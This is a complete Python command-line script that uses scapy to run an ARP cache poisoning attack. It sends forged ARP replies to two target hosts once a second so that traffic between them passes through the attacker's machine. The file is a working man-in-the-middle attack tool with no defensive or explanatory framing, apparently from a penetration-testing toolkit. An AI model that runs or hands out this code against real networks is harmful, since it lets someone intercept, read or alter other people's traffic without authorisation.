import logging
import time

import click

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import ARP, Ether, conf, getmacbyip, sendp


@click.command()
@click.argument('t1')
@click.argument('t2')
@click.option('-i', 'iface', default=None, help='Interface to use')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_arpoison(t1, t2, iface, verbose):
    """ARP cache poison"""

    conf.verb = False

    if iface:
        conf.iface = iface

    mac1 = getmacbyip(t1)
    mac2 = getmacbyip(t2)

    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=t2, pdst=t1, hwdst=mac1)
    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=t1, pdst=t2, hwdst=mac2)

    try:
        while 1:
            sendp(pkt1)
            sendp(pkt2)

            if verbose:
                pkt1.show2()
                pkt2.show2()
            else:
                print(pkt1.summary())
                print(pkt2.summary())

            time.sleep(1)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    cmd_arpoison()
